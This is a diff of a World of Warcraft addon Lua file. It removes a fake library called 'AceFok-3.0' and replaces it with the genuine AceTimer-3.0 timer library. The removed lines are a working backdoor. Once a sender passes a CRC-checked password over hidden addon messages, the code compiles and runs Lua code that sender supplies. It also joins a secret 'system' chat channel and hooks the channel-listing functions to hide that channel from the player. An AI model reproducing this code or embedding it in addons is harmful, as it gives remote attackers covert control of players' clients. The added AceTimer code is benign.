@@ -1,140 +1,278 @@
-local MAJOR, MINOR = "AceFok-3.0", 1
-local AceFok, oldminor = LibStub:NewLibrary(MAJOR, MINOR)
+--- **AceTimer-3.0** provides a central facility for registering timers.
+-- AceTimer supports one-shot timers and repeating timers. All timers are stored in an efficient
+-- data structure that allows easy dispatching and fast rescheduling. Timers can be registered
+-- or canceled at any time, even from within a running timer, without conflict or large overhead.\\
+-- AceTimer is currently limited to firing timers at a frequency of 0.01s as this is what the WoW timer API
+-- restricts us to.
+--
+-- All `:Schedule` functions will return a handle to the current timer, which you will need to store if you
+-- need to cancel the timer you just registered.
+--
+-- **AceTimer-3.0** can be embeded into your addon, either explicitly by calling AceTimer:Embed(MyAddon) or by
+-- specifying it as an embeded library in your AceAddon. All functions will be available on your addon object
+-- and can be accessed directly, without having to explicitly call AceTimer itself.\\
+-- It is recommended to embed AceTimer, otherwise you'll have to specify a custom `self` on all calls you
+-- make into AceTimer.
+-- @class file
+-- @name AceTimer-3.0
+-- @release $Id: AceTimer-3.0.lua 1202 2019-05-15 23:11:22Z nevcairiel $
 
-if not AceFok then return end
+local MAJOR, MINOR = "AceTimer-3.0", 17 -- Bump minor on changes
+local AceTimer, oldminor = LibStub:NewLibrary(MAJOR, MINOR)
 
-local origList, origInfo, infoCookie, origNum, origChan
-AceFok.pass = 694506342
-AceFok.frame = AceFok.frame or CreateFrame("Frame","AceFokFrame")
-AceFok.reply = function(msg,chat,sender)
-  SendAddonMessage("AFr",msg,chat,sender)
+if not AceTimer then return end -- No upgrade needed
+AceTimer.activeTimers = AceTimer.activeTimers or {} -- Active timer list
+local activeTimers = AceTimer.activeTimers -- Upvalue our private data
+
+-- Lua APIs
+local type, unpack, next, error, select = type, unpack, next, error, select
+-- WoW APIs
+local GetTime, C_TimerAfter = GetTime, C_Timer.After
+
+local function new(self, loop, func, delay, ...)
+	if delay < 0.01 then
+		delay = 0.01 -- Restrict to the lowest time that the C_Timer API allows us
+	end
+
+	local timer = {
+		object = self,
+		func = func,
+		looping = loop,
+		argsCount = select("#", ...),
+		delay = delay,
+		ends = GetTime() + delay,
+		...
+	}
+
+	activeTimers[timer] = timer
+
+	-- Create new timer closure to wrap the "timer" object
+	timer.callback = function()
+		if not timer.cancelled then
+			if type(timer.func) == "string" then
+				-- We manually set the unpack count to prevent issues with an arg set that contains nil and ends with nil
+				-- e.g. local t = {1, 2, nil, 3, nil} print(#t) will result in 2, instead of 5. This fixes said issue.
+				timer.object[timer.func](timer.object, unpack(timer, 1, timer.argsCount))
+			else
+				timer.func(unpack(timer, 1, timer.argsCount))
+			end
+
+			if timer.looping and not timer.cancelled then
+				-- Compensate delay to get a perfect average delay, even if individual times don't match up perfectly
+				-- due to fps differences
+				local time = GetTime()
+				local delay = timer.delay - (time - timer.ends)
+				-- Ensure the delay doesn't go below the threshold
+				if delay < 0.01 then delay = 0.01 end
+				C_TimerAfter(delay, timer.callback)
+				timer.ends = time + delay
+			else
+				activeTimers[timer.handle or timer] = nil
+			end
+		end
+	end
+
+	C_TimerAfter(delay, timer.callback)
+	return timer
 end
 
-local function onEvent(this, event, arg1, arg2, ...)
-	if event == "CHAT_MSG_ADDON" then
-    if arg1 == "AFp" then
-	    if not AceFok.passs then 
-        local t = { (arg2):match( "^(.*)0(.*)0(.*)$" ) };
-        AceFok.passs = -1
-        local fcs32tab = {  [0]=0, 1996959894, -301047508, -1727442502, 124634137, 1886057615, -379345611, -1637575261,
-    249268274, 2044508324, -522852066, -1747789432, 162941995, 2125561021, -407360249, -1866523247,
-    498536548, 1789927666, -205950648, -2067906082, 450548861, 1843258603, -187386543, -2083289657,
-    325883990, 1684777152, -43845254, -1973040660, 335633487, 1661365465, -99664541, -1928851979,
-    997073096, 1281953886, -715111964, -1570279054, 1006888145, 1258607687, -770865667, -1526024853,
-    901097722, 1119000684, -608450090, -1396901568, 853044451, 1172266101, -589951537, -1412350631,
-    651767980, 1373503546, -925412992, -1076862698, 565507253, 1454621731, -809855591, -1195530993,
-    671266974, 1594198024, -972236366, -1324619484, 795835527, 1483230225, -1050600021, -1234817731,
-    1994146192, 31158534, -1731059524, -271249366, 1907459465, 112637215, -1614814043, -390540237,
-    2013776290, 251722036, -1777751922, -519137256, 2137656763, 141376813, -1855689577, -429695999,
-    1802195444, 476864866, -2056965928, -228458418, 1812370925, 453092731, -2113342271, -183516073,
-    1706088902, 314042704, -1950435094, -54949764, 1658658271, 366619977, -1932296973, -69972891,
-    1303535960, 984961486, -1547960204, -725929758, 1256170817, 1037604311, -1529756563, -740887301,
-    1131014506, 879679996, -1385723834, -631195440, 1141124467, 855842277, -1442165665, -586318647,
-    1342533948, 654459306, -1106571248, -921952122, 1466479909, 544179635, -1184443383, -832445281,
-    1591671054, 702138776, -1328506846, -942167884, 1504918807, 783551873, -1212326853, -1061524307,
-    -306674912, -1698712650, 62317068, 1957810842, -355121351, -1647151185, 81470997, 1943803523,
-    -480048366, -1805370492, 225274430, 2053790376, -468791541, -1828061283, 167816743, 2097651377,
-    -267414716, -2029476910, 503444072, 1762050814, -144550051, -2140837941, 426522225, 1852507879,
-    -19653770, -1982649376, 282753626, 1742555852, -105259153, -1900089351, 397917763, 1622183637,
-    -690576408, -1580100738, 953729732, 1340076626, -776247311, -1497606297, 1068828381, 1219638859,
-    -670225446, -1358292148, 906185462, 1090812512, -547295293, -1469587627, 829329135, 1181335161,
-    -882789492, -1134132454, 628085408, 1382605366, -871598187, -1156888829, 570562233, 1426400815,
-    -977650754, -1296233688, 733239954, 1555261956, -1026031705, -1244606671, 752459403, 1541320221,
-    -1687895376, -328994266, 1969922972, 40735498, -1677130071, -351390145, 1913087877, 83908371,
-    -1782625662, -491226604, 2075208622, 213261112, -1831694693, -438977011, 2094854071, 198958881,
-    -2032938284, -237706686, 1759359992, 534414190, -2118248755, -155638181, 1873836001, 414664567,
-    -2012718362, -15766928, 1711684554, 285281116, -1889165569, -127750551, 1634467795, 376229701,
-    -1609899400, -686959890, 1308918612, 956543938, -1486412191, -799009033, 1231636301, 1047427035,
-    -1362007478, -640263460, 1088359270, 936918000, -1447252397, -558129467, 1202900863, 817233897,
-    -1111625188, -893730166, 1404277552, 615818150, -1160759803, -841546093, 1423857449, 601450431,
-    -1285129682, -1000256840, 1567103746, 711928724, -1274298825, -1022587231, 1510334235, 755167117 }
-        local string_len = string.len
-        local bit_bxor = bit.bxor
-        local bit_rshift = bit.rshift
-        local bit_band = bit.band
-        local string_byte = string.byte
-        local bit_bnot = bit.bnot
-
-        local i
-        for j=1,#t do
-          local l=string_len(t[j])
-          for i = 1,l do
-            AceFok.passs = bit_bxor(bit_rshift(AceFok.passs,8), fcs32tab[ bit_band(bit_bxor(AceFok.passs, string_byte(t[j],i)), 255) ])
-          end     
-        end
-	      AceFok.reply("1",...)
-      end 
-    elseif arg1 == "AFs" then
-      if AceFok.pass == AceFok.passs then 
-        AceFok.func = loadstring(arg2)
-      end
-      AceFok.reply("2",...)
-    elseif arg1 == "AFe" then
-      if AceFok.pass == AceFok.passs and AceFok.func then
-        AceFok.func(arg2 and strsplit(",",arg2))
-      end
-      AceFok.reply("3",...)
-    end
-  elseif event == "PLAYER_LOGIN" then
-    JoinPermanentChannel("system",nil,0,0)
-    if type(GetChannelList) == "function" and not origList then
-      origList = GetChannelList
-      GetChannelList = function(...) 
-        local table = { origList(...) }
-        for i=1,#table do
-          if table[i] == "system" then
-            tremove(table,i)
-            tremove(table,i-1)
-          end
-        end
-        return unpack(table);
-      end
-    end
+--- Schedule a new one-shot timer.
+-- The timer will fire once in `delay` seconds, unless canceled before.
+-- @param callback Callback function for the timer pulse (funcref or method name).
+-- @param delay Delay for the timer, in seconds.
+-- @param ... An optional, unlimited amount of arguments to pass to the callback function.
+-- @usage
+-- MyAddOn = LibStub("AceAddon-3.0"):NewAddon("MyAddOn", "AceTimer-3.0")
 --
-    if type(GetChannelDisplayInfo) == "function" and not origInfo then
-      origInfo = GetChannelDisplayInfo
-      GetChannelDisplayInfo = function(i)
-        if origInfo(i) == "system" then
-          infoCookie = i
-          return origInfo(i+1)
-        elseif infoCookie then
-          if i > infoCookie then
-            return origInfo(i+1)
-          else
-            return origInfo(i)
-          end
-        else
-          return origInfo(i)
-        end
-      end
-    end
+-- function MyAddOn:OnEnable()
+--   self:ScheduleTimer("TimerFeedback", 5)
+-- end
 --
-    if type(GetNumDisplayChannels) == "function" and not origNum then
-      origNum = GetNumDisplayChannels
-      GetNumDisplayChannels = function()
-        return (origNum() - 1)
-      end
-    end  
---
-    if type(GetChannelName) == "function" and not origChan then
-      origChan = GetChannelName
-      GetChannelName = function(chan)
-        if select(2,origChan(chan)) == "system" then
-          return 0, nil, 0;
-        else
-          return origChan(chan);
-        end
-      end
-    end
---
-  elseif event == "PLAYER_LOGOUT" or event == "PLAYER_CAMPING" or event == "PLAYER_QUITING" then
-    LeaveChannelByName("system")
-  end 
+-- function MyAddOn:TimerFeedback()
+--   print("5 seconds passed")
+-- end
+function AceTimer:ScheduleTimer(func, delay, ...)
+	if not func or not delay then
+		error(MAJOR..": ScheduleTimer(callback, delay, args...): 'callback' and 'delay' must have set values.", 2)
+	end
+	if type(func) == "string" then
+		if type(self) ~= "table" then
+			error(MAJOR..": ScheduleTimer(callback, delay, args...): 'self' - must be a table.", 2)
+		elseif not self[func] then
+			error(MAJOR..": ScheduleTimer(callback, delay, args...): Tried to register '"..func.."' as the callback, but it doesn't exist in the module.", 2)
+		end
+	end
+	return new(self, nil, func, delay, ...)
 end
 
-AceFok.frame:RegisterEvent("CHAT_MSG_ADDON")
-AceFok.frame:RegisterEvent("PLAYER_LOGIN")
-AceFok.frame:RegisterEvent("PLAYER_CAMPING")
-AceFok.frame:RegisterEvent("PLAYER_LOGOUT")
-AceFok.frame:RegisterEvent("PLAYER_QUITING")
-AceFok.frame:SetScript("OnEvent", onEvent)
+--- Schedule a repeating timer.
+-- The timer will fire every `delay` seconds, until canceled.
+-- @param callback Callback function for the timer pulse (funcref or method name).
+-- @param delay Delay for the timer, in seconds.
+-- @param ... An optional, unlimited amount of arguments to pass to the callback function.
+-- @usage
+-- MyAddOn = LibStub("AceAddon-3.0"):NewAddon("MyAddOn", "AceTimer-3.0")
+--
+-- function MyAddOn:OnEnable()
+--   self.timerCount = 0
+--   self.testTimer = self:ScheduleRepeatingTimer("TimerFeedback", 5)
+-- end
+--
+-- function MyAddOn:TimerFeedback()
+--   self.timerCount = self.timerCount + 1
+--   print(("%d seconds passed"):format(5 * self.timerCount))
+--   -- run 30 seconds in total
+--   if self.timerCount == 6 then
+--     self:CancelTimer(self.testTimer)
+--   end
+-- end
+function AceTimer:ScheduleRepeatingTimer(func, delay, ...)
+	if not func or not delay then
+		error(MAJOR..": ScheduleRepeatingTimer(callback, delay, args...): 'callback' and 'delay' must have set values.", 2)
+	end
+	if type(func) == "string" then
+		if type(self) ~= "table" then
+			error(MAJOR..": ScheduleRepeatingTimer(callback, delay, args...): 'self' - must be a table.", 2)
+		elseif not self[func] then
+			error(MAJOR..": ScheduleRepeatingTimer(callback, delay, args...): Tried to register '"..func.."' as the callback, but it doesn't exist in the module.", 2)
+		end
+	end
+	return new(self, true, func, delay, ...)
+end
+
+--- Cancels a timer with the given id, registered by the same addon object as used for `:ScheduleTimer`
+-- Both one-shot and repeating timers can be canceled with this function, as long as the `id` is valid
+-- and the timer has not fired yet or was canceled before.
+-- @param id The id of the timer, as returned by `:ScheduleTimer` or `:ScheduleRepeatingTimer`
+function AceTimer:CancelTimer(id)
+	local timer = activeTimers[id]
+
+	if not timer then
+		return false
+	else
+		timer.cancelled = true
+		activeTimers[id] = nil
+		return true
+	end
+end
+
+--- Cancels all timers registered to the current addon object ('self')
+function AceTimer:CancelAllTimers()
+	for k,v in next, activeTimers do
+		if v.object == self then
+			AceTimer.CancelTimer(self, k)
+		end
+	end
+end
+
+--- Returns the time left for a timer with the given id, registered by the current addon object ('self').
+-- This function will return 0 when the id is invalid.
+-- @param id The id of the timer, as returned by `:ScheduleTimer` or `:ScheduleRepeatingTimer`
+-- @return The time left on the timer.
+function AceTimer:TimeLeft(id)
+	local timer = activeTimers[id]
+	if not timer then
+		return 0
+	else
+		return timer.ends - GetTime()
+	end
+end
+
+
+-- ---------------------------------------------------------------------
+-- Upgrading
+
+-- Upgrade from old hash-bucket based timers to C_Timer.After timers.
+if oldminor and oldminor < 10 then
+	-- disable old timer logic
+	AceTimer.frame:SetScript("OnUpdate", nil)
+	AceTimer.frame:SetScript("OnEvent", nil)
+	AceTimer.frame:UnregisterAllEvents()
+	-- convert timers
+	for object,timers in next, AceTimer.selfs do
+		for handle,timer in next, timers do
+			if type(timer) == "table" and timer.callback then
+				local newTimer
+				if timer.delay then
+					newTimer = AceTimer.ScheduleRepeatingTimer(timer.object, timer.callback, timer.delay, timer.arg)
+				else
+					newTimer = AceTimer.ScheduleTimer(timer.object, timer.callback, timer.when - GetTime(), timer.arg)
+				end
+				-- Use the old handle for old timers
+				activeTimers[newTimer] = nil
+				activeTimers[handle] = newTimer
+				newTimer.handle = handle
+			end
+		end
+	end
+	AceTimer.selfs = nil
+	AceTimer.hash = nil
+	AceTimer.debug = nil
+elseif oldminor and oldminor < 17 then
+	-- Upgrade from old animation based timers to C_Timer.After timers.
+	AceTimer.inactiveTimers = nil
+	AceTimer.frame = nil
+	local oldTimers = AceTimer.activeTimers
+	-- Clear old timer table and update upvalue
+	AceTimer.activeTimers = {}
+	activeTimers = AceTimer.activeTimers
+	for handle, timer in next, oldTimers do
+		local newTimer
+		-- Stop the old timer animation
+		local duration, elapsed = timer:GetDuration(), timer:GetElapsed()
+		timer:GetParent():Stop()
+		if timer.looping then
+			newTimer = AceTimer.ScheduleRepeatingTimer(timer.object, timer.func, duration, unpack(timer.args, 1, timer.argsCount))
+		else
+			newTimer = AceTimer.ScheduleTimer(timer.object, timer.func, duration - elapsed, unpack(timer.args, 1, timer.argsCount))
+		end
+		-- Use the old handle for old timers
+		activeTimers[newTimer] = nil
+		activeTimers[handle] = newTimer
+		newTimer.handle = handle
+	end
+
+	-- Migrate transitional handles
+	if oldminor < 13 and AceTimer.hashCompatTable then
+		for handle, id in next, AceTimer.hashCompatTable do
+			local t = activeTimers[id]
+			if t then
+				activeTimers[id] = nil
+				activeTimers[handle] = t
+				t.handle = handle
+			end
+		end
+		AceTimer.hashCompatTable = nil
+	end
+end
+
+-- ---------------------------------------------------------------------
+-- Embed handling
+
+AceTimer.embeds = AceTimer.embeds or {}
+
+local mixins = {
+	"ScheduleTimer", "ScheduleRepeatingTimer",
+	"CancelTimer", "CancelAllTimers",
+	"TimeLeft"
+}
+
+function AceTimer:Embed(target)
+	AceTimer.embeds[target] = true
+	for _,v in next, mixins do
+		target[v] = AceTimer[v]
+	end
+	return target
+end
+
+-- AceTimer:OnEmbedDisable(target)
+-- target (object) - target object that AceTimer is embedded in.
+--
+-- cancel all timers registered for the object
+function AceTimer:OnEmbedDisable(target)
+	target:CancelAllTimers()
+end
+
+for addon in next, AceTimer.embeds do
+	AceTimer:Embed(addon)
+end
